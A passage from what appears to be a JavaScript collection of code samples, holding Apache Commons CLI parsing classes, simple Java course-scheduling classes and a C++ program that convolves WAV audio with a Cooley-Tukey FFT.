		                
		                List&ltString&gt matchingOpts = options.getMatchingOptions(opt);

		                if (matchingOpts.isEmpty())
		                {
		                    processNonOptionToken(token, stopAtNonOption);
		                }
		                else if (matchingOpts.size() &gt 1)
		                {
		                    throw new AmbiguousOptionException(opt, matchingOpts);
		                }
		                else
		                {
		                    currentOption = options.getOption(matchingOpts.get(0));
		                    
		                    tokens.add("--" + currentOption.getLongOpt());
		                    if (pos != -1)
		                    {
		                        tokens.add(token.substring(pos + 1));
		                    }
		                }
		            }

		            else if (token.startsWith("-"))
		            {
		                if (token.length() == 2 || options.hasOption(token))
		                {
		                    processOptionToken(token, stopAtNonOption);
		                }
		                else if (!options.getMatchingOptions(token).isEmpty())
		                {
		                    List&ltString&gt matchingOpts = options.getMatchingOptions(token);
		                    if (matchingOpts.size() &gt 1)
		                    {
		                        throw new AmbiguousOptionException(token, matchingOpts);
		                    }
		                    Option opt = options.getOption(matchingOpts.get(0));
		                    processOptionToken("-" + opt.getLongOpt(), stopAtNonOption);
		                }
		                // requires bursting
		                else
		                {
		                    burstToken(token, stopAtNonOption);
		                }
		            }
		            else
		            {
		                processNonOptionToken(token, stopAtNonOption);
		            }

		            gobble(iter);
		        }

		        return tokens.toArray(new String[tokens.size()]);
		    }

		    /**
		     * Adds the remaining tokens to the processed tokens list.
		     *
		     * @param iter An iterator over the remaining tokens
		     */
		    private void gobble(Iterator&ltString&gt iter)
		    {
		        if (eatTheRest)
		        {
		            while (iter.hasNext())
		            {
		                tokens.add(iter.next());
		            }
		        }
		    }

		    /**
		     * Add the special token "&ltb&gt--&lt/b&gt" and the current &ltcode&gtvalue&lt/code&gt
		     * to the processed tokens list. Then add all the remaining
		     * &ltcode&gtargument&lt/code&gt values to the processed tokens list.
		     *
		     * @param value The current token
		     */
		    private void processNonOptionToken(String value, boolean stopAtNonOption)
		    {
		        if (stopAtNonOption && (currentOption == null || !currentOption.hasArg()))
		        {
		            eatTheRest = true;
		            tokens.add("--");
		        }

		        tokens.add(value);
		    }

		    /**
		     * &ltp&gtIf an {@link Option} exists for &ltcode&gttoken&lt/code&gt then
		     * add the token to the processed list.&lt/p&gt
		     *
		     * &ltp&gtIf an {@link Option} does not exist and &ltcode&gtstopAtNonOption&lt/code&gt
		     * is set then add the remaining tokens to the processed tokens list
		     * directly.&lt/p&gt
		     *
		     * @param token The current option token
		     * @param stopAtNonOption Specifies whether flattening should halt
		     * at the first non option.
		     */
		    private void processOptionToken(String token, boolean stopAtNonOption)
		    {
		        if (stopAtNonOption && !options.hasOption(token))
		        {
		            eatTheRest = true;
		        }

		        if (options.hasOption(token))
		        {
		            currentOption = options.getOption(token);
		        }

		        tokens.add(token);
		    }

		    /**
		     * Breaks &ltcode&gttoken&lt/code&gt into its constituent parts
		     * using the following algorithm.
		     *
		     * &ltul&gt
		     *  &ltli&gtignore the first character ("&ltb&gt-&lt/b&gt")&lt/li&gt
		     *  &ltli&gtfor each remaining character check if an {@link Option}
		     *  exists with that id.&lt/li&gt
		     *  &ltli&gtif an {@link Option} does exist then add that character
		     *  prepended with "&ltb&gt-&lt/b&gt" to the list of processed tokens.&lt/li&gt
		     *  &ltli&gtif the {@link Option} can have an argument value and there
		     *  are remaining characters in the token then add the remaining
		     *  characters as a token to the list of processed tokens.&lt/li&gt
		     *  &ltli&gtif an {@link Option} does &ltb&gtNOT&lt/b&gt exist &ltb&gtAND&lt/b&gt
		     *  &ltcode&gtstopAtNonOption&lt/code&gt &ltb&gtIS&lt/b&gt set then add the special token
		     *  "&ltb&gt--&lt/b&gt" followed by the remaining characters and also
		     *  the remaining tokens directly to the processed tokens list.&lt/li&gt
		     *  &ltli&gtif an {@link Option} does &ltb&gtNOT&lt/b&gt exist &ltb&gtAND&lt/b&gt
		     *  &ltcode&gtstopAtNonOption&lt/code&gt &ltb&gtIS NOT&lt/b&gt set then add that
		     *  character prepended with "&ltb&gt-&lt/b&gt".&lt/li&gt
		     * &lt/ul&gt
		     *
		     * @param token The current token to be &ltb&gtburst&lt/b&gt
		     * @param stopAtNonOption Specifies whether to stop processing
		     * at the first non-Option encountered.
		     */
		    protected void burstToken(String token, boolean stopAtNonOption)
		    {
		        for (int i = 1; i &lt token.length(); i++)
		        {
		            String ch = String.valueOf(token.charAt(i));

		            if (options.hasOption(ch))
		            {
		                tokens.add("-" + ch);
		                currentOption = options.getOption(ch);

		                if (currentOption.hasArg() && token.length() != i + 1)
		                {
		                    tokens.add(token.substring(i + 1));

		                    break;
		                }
		            }
		            else if (stopAtNonOption)
		            {
		                processNonOptionToken(token.substring(i), true);
		                break;
		            }
		            else
		            {
		                tokens.add(token);
		                break;
		            }
		        }
		    }
		}`
	},
	ai31: {
		type: 'java',
		code: `
		/* Preference
		 * A custom class used to store information about preferred times for courses and labs
		 * Takes a string as input of form: Day Time Faculty Course# LEC Lec# TUT Tut# Weight
		 * Contains get methods for all private variables
		 */

		public class Preference {
		    private final String day;
		    private final String time;
		    private final String faculty;
		    private final int cnum;
		    private final int lsec;
		    private final int tsec;
		    private final int weight;

		    public Preference(String day, String time, String faculty, int cnum, int lsec, int tsec, int weight){
		        this.day = day;
		        this.time = time;
		        this.faculty = faculty;
		        this.cnum = cnum;
		        this.lsec = lsec;
		        this.tsec = tsec;
		        this.weight = weight;
		    }

		    public String getDay() { return day; }
		    public String getTime() { return time; }
		    public String getFaculty() { return faculty; }
		    public int getCourseNum() { return cnum; }
		    public int getLecSec() { return lsec; }
		    public int getTutSec() { return  tsec; }
		    public int getWeight() { return weight; }
		}`
	},
	ai32: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.File;

		import java.net.MalformedURLException;
		import java.net.URL;

		import java.util.Date;

		/**
		 * This is a temporary implementation. TypeHandler will handle the
		 * pluggableness of OptionTypes and it will direct all of these types
		 * of conversion functionalities to ConvertUtils component in Commons
		 * already. BeanUtils I think.
		 *
		 * @version $Id: TypeHandler.java 1677452 2015-05-03 17:10:00Z ggregory $
		 */
		public class TypeHandler
		{
		    /**
		     * Returns the &ltcode&gtObject&lt/code&gt of type &ltcode&gtobj&lt/code&gt
		     * with the value of &ltcode&gtstr&lt/code&gt.
		     *
		     * @param str the command line value
		     * @param obj the type of argument
		     * @return The instance of &ltcode&gtobj&lt/code&gt initialised with
		     * the value of &ltcode&gtstr&lt/code&gt.
		     * @throws ParseException if the value creation for the given object type failed
		     */
		    public static Object createValue(String str, Object obj) throws ParseException
		    {
		        return createValue(str, (Class&lt?&gt) obj);
		    }

		    /**
		     * Returns the &ltcode&gtObject&lt/code&gt of type &ltcode&gtclazz&lt/code&gt
		     * with the value of &ltcode&gtstr&lt/code&gt.
		     *
		     * @param str the command line value
		     * @param clazz the type of argument
		     * @return The instance of &ltcode&gtclazz&lt/code&gt initialised with
		     * the value of &ltcode&gtstr&lt/code&gt.
		     * @throws ParseException if the value creation for the given class failed
		     */
		    public static Object createValue(String str, Class&lt?&gt clazz) throws ParseException
		    {
		        if (PatternOptionBuilder.STRING_VALUE == clazz)
		        {
		            return str;
		        }
		        else if (PatternOptionBuilder.OBJECT_VALUE == clazz)
		        {
		            return createObject(str);
		        }
		        else if (PatternOptionBuilder.NUMBER_VALUE == clazz)
		        {
		            return createNumber(str);
		        }
		        else if (PatternOptionBuilder.DATE_VALUE == clazz)
		        {
		            return createDate(str);
		        }
		        else if (PatternOptionBuilder.CLASS_VALUE == clazz)
		        {
		            return createClass(str);
		        }
		        else if (PatternOptionBuilder.FILE_VALUE == clazz)
		        {
		            return createFile(str);
		        }
		        else if (PatternOptionBuilder.EXISTING_FILE_VALUE == clazz)
		        {
		            return createFile(str);
		        }
		        else if (PatternOptionBuilder.FILES_VALUE == clazz)
		        {
		            return createFiles(str);
		        }
		        else if (PatternOptionBuilder.URL_VALUE == clazz)
		        {
		            return createURL(str);
		        }
		        else
		        {
		            return null;
		        }
		    }

		    /**
		      * Create an Object from the classname and empty constructor.
		      *
		      * @param classname the argument value
		      * @return the initialised object
		      * @throws ParseException if the class could not be found or the object could not be created
		      */
		    public static Object createObject(String classname) throws ParseException
		    {
		        Class&lt?&gt cl;

		        try
		        {
		            cl = Class.forName(classname);
		        }
		        catch (ClassNotFoundException cnfe)
		        {
		            throw new ParseException("Unable to find the class: " + classname);
		        }
		        
		        try
		        {
		            return cl.newInstance();
		        }
		        catch (Exception e)
		        {
		            throw new ParseException(e.getClass().getName() + "; Unable to create an instance of: " + classname);
		        }
		    }

		    /**
		     * Create a number from a String. If a . is present, it creates a
		     * Double, otherwise a Long.
		     *
		     * @param str the value
		     * @return the number represented by &ltcode&gtstr&lt/code&gt
		     * @throws ParseException if &ltcode&gtstr&lt/code&gt is not a number
		     */
		    public static Number createNumber(String str) throws ParseException
		    {
		        try
		        {
		            if (str.indexOf('.') != -1)
		            {
		                return Double.valueOf(str);
		            }
		            return Long.valueOf(str);
		        }
		        catch (NumberFormatException e)
		        {
		            throw new ParseException(e.getMessage());
		        }
		    }

		    /**
		     * Returns the class whose name is &ltcode&gtclassname&lt/code&gt.
		     *
		     * @param classname the class name
		     * @return The class if it is found
		     * @throws ParseException if the class could not be found
		     */
		    public static Class&lt?&gt createClass(String classname) throws ParseException
		    {
		        try
		        {
		            return Class.forName(classname);
		        }
		        catch (ClassNotFoundException e)
		        {
		            throw new ParseException("Unable to find the class: " + classname);
		        }
		    }

		    /**
		     * Returns the date represented by &ltcode&gtstr&lt/code&gt.
		     * &ltp&gt
		     * This method is not yet implemented and always throws an
		     * {@link UnsupportedOperationException}.
		     *
		     * @param str the date string
		     * @return The date if &ltcode&gtstr&lt/code&gt is a valid date string,
		     * otherwise return null.
		     * @throws UnsupportedOperationException always
		     */
		    public static Date createDate(String str)
		    {
		        throw new UnsupportedOperationException("Not yet implemented");
		    }

		    /**
		     * Returns the URL represented by &ltcode&gtstr&lt/code&gt.
		     *
		     * @param str the URL string
		     * @return The URL in &ltcode&gtstr&lt/code&gt is well-formed
		     * @throws ParseException if the URL in &ltcode&gtstr&lt/code&gt is not well-formed
		     */
		    public static URL createURL(String str) throws ParseException
		    {
		        try
		        {
		            return new URL(str);
		        }
		        catch (MalformedURLException e)
		        {
		            throw new ParseException("Unable to parse the URL: " + str);
		        }
		    }

		    /**
		     * Returns the File represented by &ltcode&gtstr&lt/code&gt.
		     *
		     * @param str the File location
		     * @return The file represented by &ltcode&gtstr&lt/code&gt.
		     */
		    public static File createFile(String str)
		    {
		        return new File(str);
		    }

		    /**
		     * Returns the File[] represented by &ltcode&gtstr&lt/code&gt.
		     * &ltp&gt
		     * This method is not yet implemented and always throws an
		     * {@link UnsupportedOperationException}.
		     *
		     * @param str the paths to the files
		     * @return The File[] represented by &ltcode&gtstr&lt/code&gt.
		     * @throws UnsupportedOperationException always
		     */
		    public static File[] createFiles(String str)
		    {
		        // to implement/port:
		        //        return FileW.findFiles(str);
		        throw new UnsupportedOperationException("Not yet implemented");
		    }
		}`
	},
	ai33: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * Exception thrown during parsing signalling an unrecognized
		 * option was seen.
		 *
		 * @version $Id: UnrecognizedOptionException.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		public class UnrecognizedOptionException extends ParseException
		{
		    /**
		     * This exception {@code serialVersionUID}.
		     */
		    private static final long serialVersionUID = -252504690284625623L;

		    /** The  unrecognized option */
		    private String option;

		    /**
		     * Construct a new &ltcode&gtUnrecognizedArgumentException&lt/code&gt
		     * with the specified detail message.
		     *
		     * @param message the detail message
		     */
		    public UnrecognizedOptionException(String message)
		    {
		        super(message);
		    }

		    /**
		     * Construct a new &ltcode&gtUnrecognizedArgumentException&lt/code&gt
		     * with the specified option and detail message.
		     *
		     * @param message the detail message
		     * @param option  the unrecognized option
		     * @since 1.2
		     */
		    public UnrecognizedOptionException(String message, String option)
		    {
		        this(message);
		        this.option = option;
		    }

		    /**
		     * Returns the unrecognized option.
		     *
		     * @return the related option
		     * @since 1.2
		     */
		    public String getOption()
		    {
		        return option;
		    }
		}`
	},
	ai34: {
		type: 'java',
		code: `
		/* Unwanted
		 * A custom class used to store information about unwanted courses/labs
		 * Takes a string as input
		 * Contains get methods for all private variables
		 */

		public class Unwanted {
		    private final String faculty;
		    private final int cnum;
		    private final int lsec;
		    private final String day;
		    private final String time;

		    public Unwanted(String s){
		        String[] arr = s.split(",");
		        this.day = arr[1].trim();
		        this.time = arr[2].trim();
		        String[] arr1 = arr[0].trim().split(" ");
		        if(arr1.length &gt 4) {
		            int count = 0;
		            for (String st : arr1) {
		                if (st.equals("")) {
		                    count += 1;
		                }
		            }
		            String[] ndata = new String[arr1.length - count];
		            int i = 0;
		            for (String st : arr1){
		                if(!st.equals("")){
		                    ndata[i] = st;
		                    i += 1;
		                }
		            }
		            arr1 = ndata;
		        }
		        this.faculty = arr1[0].trim();
		        this.cnum = Integer.parseInt(arr1[1].trim());
		        this.lsec = Integer.parseInt(arr1[3].trim());
		    }

		    public String getFaculty() { return faculty; }
		    public int getCourseNum() { return cnum; }
		    public int getLecSec() { return lsec; }
		    public String getDay() { return day; }
		    public String getTime() { return time; }
		}`
	},
	ai35: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * Contains useful helper methods for classes within this package.
		 *
		 * @version $Id: Util.java 1443102 2013-02-06 18:12:16Z tn $
		 */
		final class Util
		{
		    /**
		     * Remove the hyphens from the beginning of &ltcode&gtstr&lt/code&gt and
		     * return the new String.
		     *
		     * @param str The string from which the hyphens should be removed.
		     *
		     * @return the new String.
		     */
		    static String stripLeadingHyphens(String str)
		    {
		        if (str == null)
		        {
		            return null;
		        }
		        if (str.startsWith("--"))
		        {
		            return str.substring(2, str.length());
		        }
		        else if (str.startsWith("-"))
		        {
		            return str.substring(1, str.length());
		        }

		        return str;
		    }

		    /**
		     * Remove the leading and trailing quotes from &ltcode&gtstr&lt/code&gt.
		     * E.g. if str is '"one two"', then 'one two' is returned.
		     *
		     * @param str The string from which the leading and trailing quotes
		     * should be removed.
		     *
		     * @return The string without the leading and trailing quotes.
		     */
		    static String stripLeadingAndTrailingQuotes(String str)
		    {
		        int length = str.length();
		        if (length &gt 1 && str.startsWith("\"") && str.endsWith("\"") && str.substring(1, length - 1).indexOf('"') == -1)
		        {
		            str = str.substring(1, length - 1);
		        }
		        
		        return str;
		    }
		}`
	},
	AC: {
		type: 'c++',
		code: `
		#include &ltiostream&gt
		#include &ltiterator&gt
		#include &ltfstream&gt
		#include &ltmath.h&gt
		#include &ltcstring&gt
		#include "WAV.h"
		using namespace std;

		/*
		To run pre-FFT version of the program:
		    g++ convolveInit.cpp Wav.cpp -o convolve
		    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav

		To run all other versions:
		    g++ convolveFFTVersion#.cpp Wav.pp -o convolve
		    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav FFT
		    OR
		    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav F
		    OR
		    ./convolve FluteDry.wav l960large_brite_hall.wav output.wav N -- FOR REGULAR SLOW ALGORITHM
		*/
		void makeNewWAV(char *outputWAV);
		bool isWave(char* file);
		void convolution(double* inputSignal, int inputSize, double* irSignal, int irSize, double* outputSignal, int outputSize);
		void makeNewWAVFFT(char* outputWAV);
		void CooleyTukey(double* nonDiscreteData, long dimensions);
		void CooleyTukey2(double* Data1, double* Data2, long dimensions);

		WAV* dryWav;
		WAV* pulseWav;
		int main(int argc, char * argv[]) {
		    printf("To run pre-FFT version of the program:\\ng++ convolveInit.cpp Wav.cpp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav\\n\\nTo run all other versions:\\ng++ convolveFFTVersion#.cpp Wav.pp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav FFT\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav F\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav N -- FOR REGULAR SLOW ALGORITHM\\n");

		    if(argc &lt 4){
		        printf("Program usage: ./convolve input.wav IRfile.wav output.wav [ ,N,FFT/F]\\n");
		        exit(EXIT_FAILURE);
		    }
		    char* inputWAV;
		    char* irWAV;
		    char* outputWAV;
		    char* algorithm;
		    inputWAV = argv[1];
		    irWAV = argv[2];
		    outputWAV = argv[3];
		    bool result = false;
		    int size = argc;
		    if(argc == 5) {
		        algorithm = argv[4];
		        for(int i = 1; i &lt size-1; i++){
		            if(isWave(argv[i])){
		                result = true;
		            }
		            else{
		                result = false;
		                break;
		            }
		        }
		    }
		    else {
		        algorithm = const_cast&ltchar *&gt("N");
		        for(int i = 1; i &lt size; i++){
		            if(isWave(argv[i])){
		                result = true;
		            }
		            else{
		                result = false;
		                break;
		            }
		        }
		    }
		    if(!result){
		        printf("One of the files not of right type. All files should be of type .wav\\n");
		        printf("To run pre-FFT version of the program:\\ng++ convolveInit.cpp Wav.cpp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav\\n\\nTo run all other versions:\\ng++ convolveFFTVersion#.cpp Wav.pp -o convolve\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav FFT\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav F\\nOR\\n./convolve FluteDry.wav l960large_brite_hall.wav output.wav N -- FOR REGULAR SLOW ALGORITHM\\n");
		        exit(EXIT_FAILURE);
		    }
		    //Create wav files, need to do a bit of reading as to what makes up a wav files.
		    dryWav = new WAV();
		    dryWav-&gtcreateWAV(inputWAV);
		    dryWav-&gtprintData(inputWAV);
		    pulseWav = new WAV();
		    pulseWav-&gtcreateWAV(irWAV);
		    pulseWav-&gtprintData(irWAV);
		    printf("Successfully created input WAVS\\n");
		    fflush(stdout);
		    printf("Creating convoluted WAV now...\\n");
		    if(*algorithm == 'N')
		        makeNewWAV(outputWAV);
		    else if(*algorithm == 'F')
		        makeNewWAVFFT(outputWAV);

		    exit(EXIT_SUCCESS);

		}

		void makeNewWAVFFT(char* outputWAV){
		    double* dryConvolve = new double[dryWav-&gtsigSize];
		    double* pulseConvolve = new double[pulseWav-&gtsigSize];
		    int dryFreq = dryWav-&gt sigSize;
		    int pulseFreq = pulseWav-&gt sigSize;
		    int size = dryWav-&gtsigSize + pulseWav-&gtsigSize - 1;
		    long dimensions = 1;
		    int freqSize = 0;
		    if(dryFreq &lt= pulseFreq)
		        freqSize = pulseFreq;
		    else
		        freqSize = dryFreq;

		    for(int i = 0; i &lt dryFreq; i++){
		        //dryConvolve[i] = (double) dryWav-&gtsignal[i] / 32678.0;
		        dryConvolve[i] = (double)(dryWav-&gtsignal[i] &lt&lt 15);
		    }
		    for(int i = 0; i &lt pulseFreq; i++){
		        //pulseConvolve[i] = ((double)pulseWav-&gtsignal[i]/(double)32678.0);
		        pulseConvolve[i] = (double)(pulseWav-&gtsignal[i] &lt&lt 15);
		    }

		    //Now we need to make sure the length is a power of 2 because FFT requires this to work
		    /*for(int i = 0; i &lt freqSize+1; i++){
		        dimensions = dimensions * 2;
		    }*/
		    while(dimensions &lt freqSize){
		        dimensions = dimensions &lt&lt 1;
		    }
		    dimensions = dimensions &lt&lt 1;

		    double* X = new double[dimensions];
		    double* H = new double[dimensions];
		    double* Y = new double[dimensions];
		    for(int i  = 0; i &lt dimensions; i++){
		        X[i] = 0.0;
		        H[i] = 0.0;
		        Y[i] = 0.0;

		    }
		    for(int i = 0; i &lt dryFreq; i++){
		        X[i*2] = dryConvolve[i];
		    }

		    for(int i = 0; i &lt pulseFreq; i++){
		        H[i*2] = pulseConvolve[i];
		    }
		    //CooleyTukey(X-1, dimensions/2, 1);
		    //CooleyTukey(H-1, dimensions/2, 1);
		    CooleyTukey2(X-1,H-1,dimensions/2);
		    for(int i = 0; i &lt dimensions; i+= 2){
		        Y[i] = X[i] * H[i] - X[i+1] * H[i+1]; //real
		        Y[i+1] = X[i+1] * H[i] + X[i] * H[i+1]; //complex
		    }
		    CooleyTukey(Y-1, dimensions/2);

		    double* toConvolve = new double[size];
		    double maxSig = 0.0;
		    for(int i = 0; i &lt size; i++){
		        double oneByte = Y[i*2];
		        toConvolve[i] = oneByte;
		        if(oneByte &lt 0.0){
		            oneByte = oneByte * -1.0;
		        }
		        if(maxSig &lt oneByte){
		            maxSig = oneByte;
		        }
		    }
		    double dryMax = 0.0;
		    double sigMax = 0.0;
		    for(int i = 0; i &lt size; i++){
		        if(dryWav-&gtsignal[i] &gt dryMax)
		            dryMax = dryWav-&gtsignal[i];
		        if(toConvolve[i] &gt sigMax)
		            sigMax = toConvolve[i];
		    }
		    for(int i  = 0; i &lt size; i++){
		        toConvolve[i] = toConvolve[i] / sigMax*dryMax;
		    }
		    short* outSig = new short[size];
		    for(int i = 0; i &lt size; i++){
		        outSig[i] = static_cast&ltshort&gt(toConvolve[i]);
		    }

		    printf("Writing data to file...\\n");
		    FILE* myNewWave = fopen(outputWAV, "wb");
		    unsigned char charFourArray[4];
		    unsigned char charTwoArray[2];
		    fputs("RIFF", myNewWave);
		    int chunkData = (dryWav-&gtchannels * size * (dryWav-&gtbps/8) + 36 + 36);
		    charFourArray[3] = (unsigned char)((chunkData &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((chunkData &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((chunkData &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(chunkData & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);
		    fputs("WAVE", myNewWave);
		    fputs("fmt ", myNewWave);

		    charFourArray[3] = (unsigned char)((16 &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((16 &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((16 &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(16 & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    charTwoArray[1] = (unsigned char)((1 &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)(1 & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    charFourArray[3] = (unsigned char)((dryWav-&gtsample &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((dryWav-&gtsample &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((dryWav-&gtsample &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(dryWav-&gtsample & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    charFourArray[3] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) * dryWav-&gtsample & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    charTwoArray[1] = (unsigned char)((dryWav-&gtchannels * (dryWav-&gtbps/8) &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)(dryWav-&gtchannels * (dryWav-&gtbps/8) & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    charTwoArray[1] = (unsigned char)((dryWav-&gtbps &gt&gt 8) & 0xFF);
		    charTwoArray[0] = (unsigned char)((dryWav-&gtbps) & 0xFF);
		    fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);

		    fputs("data", myNewWave);

		    charFourArray[3] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 24) & 0xFF);
		    charFourArray[2] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 16) & 0xFF);
		    charFourArray[1] = (unsigned char)(((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) &gt&gt 8) & 0xFF);
		    charFourArray[0] = (unsigned char)((dryWav-&gtchannels * size * (dryWav-&gtbps/8)) & 0xFF);
		    fwrite(charFourArray, sizeof(unsigned char), 4, myNewWave);

		    for(int i = 0; i &lt size; i++){
		        charTwoArray[1] = static_cast&ltunsigned char&gt((outSig[i] &gt&gt 8) & 0xFF);
		        charTwoArray[0] = (unsigned char) (outSig[i] & 0xFF);
		        fwrite(charTwoArray, sizeof(unsigned char), 2, myNewWave);
		    }
		    fclose(myNewWave);
		    printf("File created successfully...\\n");
		}
		void CooleyTukey2(double* Data1, double* Data2, long dimensions){
		    unsigned long n, mmax, m, j, istep, i;
		    double wtemp, wr, wpr, wpi, wi, theta;
		    double tempr, tempi;
		    float PI = static_cast&ltfloat&gt(3.141592653589793);

		    n = static_cast&ltunsigned long&gt(dimensions &lt&lt 1);
		    j=1;
		    for (i=1; i &lt n; i+=2) {
		        if (j&gti) {
		            double placeholder = Data1[j];
		            Data1[j] = Data1[i];
		            Data1[i] = placeholder;

		            placeholder = Data1[j+1];
		            Data1[j+1] = Data1[i+1];
		            Data1[i+1] = placeholder;

		            placeholder = Data2[j];
		            Data2[j] = Data2[i];
		            Data2[i] = placeholder;

		            placeholder = Data2[j+1];
		            Data2[j+1] = Data2[i+1];
		            Data2[i+1] = placeholder;
		        }
		        m = static_cast&ltunsigned long&gt(dimensions);
		        while (m&gt=2 && j&gtm) {
		            j -= m;
		            m &gt&gt= 1;
		        }

		        j += m;
		    }
		    mmax=2;
		    while (n&gtmmax) {
		        istep = mmax&lt&lt 1;
		        theta = (2*PI/mmax);
		        wtemp = sin(0.5*theta);
		        wpr = -2.0*wtemp*wtemp;
		        wpi = sin(theta);
		        wr = 1.0;
		        wi = 0.0;
		        for (m=1; m &lt mmax; m += 2) {
		            for (i=m; i &lt= n; i += istep) {
		                j=i+mmax;
		                tempr = wr*Data1[j] - wi*Data1[j+1];
		                tempi = wr * Data1[j+1] + wi*Data1[j];

		                Data1[j] = Data1[i] - tempr;
		                Data1[j+1] = Data1[i+1] - tempi;
		                Data1[i] += tempr;
		                Data1[i+1] += tempi;

		                tempr = wr*Data2[j] - wi*Data2[j+1];
		                tempi = wr*Data2[j+1] + wi*Data2[j];

		                Data2[j] = Data2[i] - tempr;
		                Data2[j+1] = Data2[i+1] - tempi;
		                Data2[i] += tempr;
		                Data2[i+1] += tempi;
		            }
		            wtemp=wr;
		            wr += wr*wpr - wi*wpi;
		            wi += wi*wpr + wtemp*wpi;
		        }
		        mmax=istep;
		    }
		}
		/*
		 * This algorithm was created by Cooley and Tukey (1965)
		 * I CLAIM NO CREDIT FOR THIS ALGORITHM, ITS JUST REALLY EFFICIENT TO USE
		 */
		void CooleyTukey(double* nonDiscreteData, long dimensions) {
		    unsigned long n, mmax, m, j, istep, i;
		    double wtemp, wr, wpr, wpi, wi, theta;
		    double tempr, tempi;
		    float PI = static_cast&ltfloat&gt(3.141592653589793);

		    n = static_cast&ltunsigned long&gt(dimensions &lt&lt 1);
		    j=1;
		    for (i=1; i &lt n; i+=2) {
		        if (j&gti) {
		            double placeholder = nonDiscreteData[j];
		            nonDiscreteData[j] = nonDiscreteData[i];
		            nonDiscreteData[i] = placeholder;

		            placeholder = nonDiscreteData[j+1];
		            nonDiscreteData[j+1] = nonDiscreteData[i+1];
		            nonDiscreteData[i+1] = placeholder;
		        }
		        m = static_cast&ltunsigned long&gt(dimensions);
		        while (m&gt=2 && j&gtm) {
		            j -= m;
		            m &gt&gt= 1;
		        }

		        j += m;
		    }
		    mmax=2;
		    while (n&gtmmax) {
		        istep = mmax&lt&lt 1;
		        theta = -1*(2*PI/mmax);
